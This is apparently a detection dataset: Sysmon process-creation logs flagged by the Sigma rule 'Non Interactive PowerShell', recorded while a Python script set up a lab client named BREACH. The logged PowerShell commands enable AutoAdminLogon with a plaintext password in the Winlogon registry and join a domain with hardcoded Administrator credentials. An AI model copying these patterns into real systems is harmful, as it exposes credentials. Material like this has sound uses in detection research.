[
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T09:57:07.462Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T10:00:27.372Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 09:57:07.462\nProcessGuid: {0e37ca90-ec73-6343-a700-000000000300}\nProcessId: 6236\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell \"$cmd_man_ip = \\\"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\\\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs\"\nCurrentDirectory: C:\\BREACH\\\nUser: CLIENT\\setup\nLogonGuid: {0e37ca90-ec39-6343-6526-030000000000}\nLogonId: 0x32665\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ec73-6343-a500-000000000300}\nParentProcessId: 1628\nParentImage: C:\\Python37\\python.exe\nParentCommandLine: C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" \nParentUser: CLIENT\\setup",
                "process": {
                    "args": [
                        "powershell",
                        "$cmd_man_ip = \"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs"
                    ],
                    "command_line": "powershell \"$cmd_man_ip = \\\"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\\\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs\"",
                    "entity_id": "{0e37ca90-ec73-6343-a700-000000000300}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "C:\\Python37\\python.exe",
                            "C:\\BREACH\\init_tbf_client.py"
                        ],
                        "command_line": "C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" ",
                        "entity_id": "{0e37ca90-ec73-6343-a500-000000000300}",
                        "executable": "C:\\Python37\\python.exe",
                        "name": "python.exe",
                        "pid": 1628
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 6236,
                    "working_directory": "C:\\BREACH\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "setup"
                },
                "user": {
                    "domain": "CLIENT",
                    "name": "setup"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ec39-6343-6526-030000000000}",
                        "LogonId": "0x32665",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT\\setup",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "1"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 1904,
                        "thread": {
                            "id": 2536
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 800,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T09:57:07.462+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T09:57:08.793Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T10:00:27.373Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 09:57:08.793\nProcessGuid: {0e37ca90-ec74-6343-af00-000000000300}\nProcessId: 6520\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101 \nCurrentDirectory: C:\\BREACH\\\nUser: CLIENT\\setup\nLogonGuid: {0e37ca90-ec39-6343-6526-030000000000}\nLogonId: 0x32665\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ec73-6343-a700-000000000300}\nParentProcessId: 6236\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell \"$cmd_man_ip = \\\"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\\\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs\"\nParentUser: CLIENT\\setup",
                "process": {
                    "args": [
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "netsh.exe",
                        "interface",
                        "ip",
                        "set",
                        "address",
                        "name='Ethernet",
                        "2'",
                        "static",
                        "192.168.56.101"
                    ],
                    "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101 ",
                    "entity_id": "{0e37ca90-ec74-6343-af00-000000000300}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "powershell",
                            "$cmd_man_ip = \"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs"
                        ],
                        "command_line": "powershell \"$cmd_man_ip = \\\"netsh.exe interface ip set address name='Ethernet 2' static 192.168.56.101\\\"; Start-Process powershell.exe -Wait -ArgumentList $cmd_man_ip -Verb RunAs\"",
                        "entity_id": "{0e37ca90-ec73-6343-a700-000000000300}",
                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "name": "powershell.exe",
                        "pid": 6236
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 6520,
                    "working_directory": "C:\\BREACH\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "setup"
                },
                "user": {
                    "domain": "CLIENT",
                    "name": "setup"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ec39-6343-6526-030000000000}",
                        "LogonId": "0x32665",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT\\setup",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "1"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 1904,
                        "thread": {
                            "id": 2536
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 811,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T09:57:08.793+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T09:57:09.848Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T10:00:27.373Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 09:57:09.848\nProcessGuid: {0e37ca90-ec75-6343-b200-000000000300}\nProcessId: 6692\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell \"$new_name = 'CLIENT1'; Rename-Computer -NewName $new_name -Restart -Force\"\nCurrentDirectory: C:\\BREACH\\\nUser: CLIENT\\setup\nLogonGuid: {0e37ca90-ec39-6343-6526-030000000000}\nLogonId: 0x32665\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ec73-6343-a500-000000000300}\nParentProcessId: 1628\nParentImage: C:\\Python37\\python.exe\nParentCommandLine: C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" \nParentUser: CLIENT\\setup",
                "process": {
                    "args": [
                        "powershell",
                        "$new_name = 'CLIENT1'; Rename-Computer -NewName $new_name -Restart -Force"
                    ],
                    "command_line": "powershell \"$new_name = 'CLIENT1'; Rename-Computer -NewName $new_name -Restart -Force\"",
                    "entity_id": "{0e37ca90-ec75-6343-b200-000000000300}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "C:\\Python37\\python.exe",
                            "C:\\BREACH\\init_tbf_client.py"
                        ],
                        "command_line": "C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" ",
                        "entity_id": "{0e37ca90-ec73-6343-a500-000000000300}",
                        "executable": "C:\\Python37\\python.exe",
                        "name": "python.exe",
                        "pid": 1628
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 6692,
                    "working_directory": "C:\\BREACH\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "setup"
                },
                "user": {
                    "domain": "CLIENT",
                    "name": "setup"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ec39-6343-6526-030000000000}",
                        "LogonId": "0x32665",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT\\setup",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "1"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 1904,
                        "thread": {
                            "id": 2536
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 815,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T09:57:09.848+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T09:57:50.450Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T10:00:27.605Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT1"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 09:57:50.450\nProcessGuid: {0e37ca90-ec9e-6343-5900-000000000400}\nProcessId: 4516\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell \"$reg_path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'\"\nCurrentDirectory: C:\\BREACH\\\nUser: CLIENT1\\setup\nLogonGuid: {0e37ca90-ec89-6343-7471-020000000000}\nLogonId: 0x27174\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ec9e-6343-5600-000000000400}\nParentProcessId: 968\nParentImage: C:\\Python37\\python.exe\nParentCommandLine: C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" \nParentUser: CLIENT1\\setup",
                "process": {
                    "args": [
                        "powershell",
                        "$reg_path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'"
                    ],
                    "command_line": "powershell \"$reg_path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty -Path $reg_path -Name 'AutoAdminLogon' -Value '1'; Set-ItemProperty -Path $reg_path -Name 'DefaultDomainName' -Value 'BREACH'; Set-ItemProperty -Path $reg_path -Name 'DefaultPassword' -Value 'breach'; Set-ItemProperty -Path $reg_path -Name 'DefaultUserName' -Value 'client1'\"",
                    "entity_id": "{0e37ca90-ec9e-6343-5900-000000000400}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "C:\\Python37\\python.exe",
                            "C:\\BREACH\\init_tbf_client.py"
                        ],
                        "command_line": "C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" ",
                        "entity_id": "{0e37ca90-ec9e-6343-5600-000000000400}",
                        "executable": "C:\\Python37\\python.exe",
                        "name": "python.exe",
                        "pid": 968
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 4516,
                    "working_directory": "C:\\BREACH\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "setup"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "setup"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ec89-6343-7471-020000000000}",
                        "LogonId": "0x27174",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT1\\setup",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "1"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 2052,
                        "thread": {
                            "id": 2532
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 947,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T09:57:50.450+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T09:57:51.254Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T10:00:27.605Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT1"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 09:57:51.254\nProcessGuid: {0e37ca90-ec9f-6343-6100-000000000400}\nProcessId: 4380\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell \"$admin_secpwd = ConvertTo-SecureString 'breach' -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'BREACH\\Administrator', $admin_secpwd; Add-Computer -Credential $credential -DomainName 'BREACH' -Restart -Force\"\nCurrentDirectory: C:\\BREACH\\\nUser: CLIENT1\\setup\nLogonGuid: {0e37ca90-ec89-6343-7471-020000000000}\nLogonId: 0x27174\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ec9e-6343-5600-000000000400}\nParentProcessId: 968\nParentImage: C:\\Python37\\python.exe\nParentCommandLine: C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" \nParentUser: CLIENT1\\setup",
                "process": {
                    "args": [
                        "powershell",
                        "$admin_secpwd = ConvertTo-SecureString 'breach' -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'BREACH\\Administrator', $admin_secpwd; Add-Computer -Credential $credential -DomainName 'BREACH' -Restart -Force"
                    ],
                    "command_line": "powershell \"$admin_secpwd = ConvertTo-SecureString 'breach' -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'BREACH\\Administrator', $admin_secpwd; Add-Computer -Credential $credential -DomainName 'BREACH' -Restart -Force\"",
                    "entity_id": "{0e37ca90-ec9f-6343-6100-000000000400}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "C:\\Python37\\python.exe",
                            "C:\\BREACH\\init_tbf_client.py"
                        ],
                        "command_line": "C:\\Python37\\python.exe \"C:\\BREACH\\init_tbf_client.py\" ",
                        "entity_id": "{0e37ca90-ec9e-6343-5600-000000000400}",
                        "executable": "C:\\Python37\\python.exe",
                        "name": "python.exe",
                        "pid": 968
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 4380,
                    "working_directory": "C:\\BREACH\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "setup"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "setup"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ec89-6343-7471-020000000000}",
                        "LogonId": "0x27174",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT1\\setup",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "1"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 2052,
                        "thread": {
                            "id": 2532
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 954,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T09:57:51.254+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
